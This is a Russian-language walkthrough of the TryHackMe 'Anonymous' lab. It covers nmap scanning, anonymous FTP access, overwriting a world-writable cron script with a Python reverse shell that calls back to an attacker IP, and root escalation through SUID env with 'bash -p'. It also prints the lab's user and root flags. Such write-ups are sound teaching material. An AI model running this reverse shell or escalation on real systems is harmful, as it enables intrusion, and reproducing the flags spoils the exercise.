# Машинка Anonymous TryHackMe

## Разведка (Reconnaissance)

Проводим разведку с помощью сканирования открытых портов утилитой `nmap`:

```bash
┌──(kali㉿kali)-[~]
└─$ nmap -sV 10.80.137.254
Starting Nmap 7.98 ( https://nmap.org ) at 2026-07-18 08:20 -0400
Nmap scan report for 10.80.137.254
Host is up (0.048s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
21/tcp  open  ftp         vsftpd 2.0.8 or later
22/tcp  open  ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
Service Info: Host: ANONYMOUS; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Открытые порты:
- **21/tcp** - FTP (vsftpd)
- **22/tcp** - SSH (OpenSSH)
- **139/tcp** - Samba
- **445/tcp** - Samba

---

## Исследование SMB

Проверяем доступные шары SMB:

```bash
smbclient -L //10.80.137.254
```

В шаре `pics` обнаружены две картинки с корги. После скачивания:
- Метаданные не содержали полезной информации
- Стегоанализ не дал результатов
- Структура файлов оказалась обычной

---

## Исследование FTP

Подключаемся к FTP-серверу:

```bash
ftp 10.80.137.254
ftp> user anonymous
```

В папке `scripts` обнаружены три файла:
- `removed_files.log`
- `to_do.txt`
- `clean.sh`

### Анализ файлов

**removed_files.log**: множество записей о том, что нечего удалять, что указывает на выполнение скрипта по расписанию (cron).

**to_do.txt**: сообщение о необходимости отключить анонимный вход в FTP.

**clean.sh**: скрипт очистки файлов. Права доступа позволяют всем пользователям читать, записывать и выполнять этот файл.

---

## Получение доступа (User Flag)

Поскольку у меня есть права на запись в директории `scripts`, я решил заменить `clean.sh` на Reverse Shell:

### 1. Скачиваем оригинальный clean.sh
```bash
ftp> get clean.sh
```

### 2. Подготавливаем полезную нагрузку
Python Reverse Shell (bash и nc не работали):

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.129.112",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

### 3. Загружаем изменённый файл
```bash
ftp> put clean.sh
```

### 4. Запускаем слушатель
```bash
nc -lnvp 4444
```

Через минуту получаем шелл:

```bash
namelessone@anonymous:~$ ls
pics  user.txt
namelessone@anonymous:~$ cat user.txt
90d6f992585815ff991e68748c414740
```

**User Flag: `90d6f992585815ff991e68748c414740`**

---

## Повышение привилегий (Privilege Escalation)

### Поиск SUID-файлов

```bash
namelessone@anonymous:/$ find / -perm -4000 2>/dev/null
```

В результатах видно множество стандартных SUID-файлов. Особый интерес представляет `/usr/bin/env`.

### Использование /usr/bin/env

Попытка с `sudo` требует пароль, который у нас отсутствует:

```bash
namelessone@anonymous:/$ env /bin/sh
$ sudo env /bin/sh
[sudo] password for namelessone: 
sudo: 3 incorrect password attempts
```

### Обход ограничений

```bash
$ env /bin/bash -p
bash-4.4# whoami
root
```

Флаг `-p` отключает сброс привилегий, что позволяет сохранить SUID-права `env`.

### Получение Root Flag

```bash
bash-4.4# cd /root
bash-4.4# ls
root.txt
bash-4.4# cat root.txt
4d930091c31a622a7ed10f27999af363
```

**Root Flag: `4d930091c31a622a7ed10f27999af363`**

---

## Итоги

| Этап | Найденные флаги |
|------|----------------|
| User | `90d6f992585815ff991e68748c414740` |
| Root | `4d930091c31a622a7ed10f27999af363` |
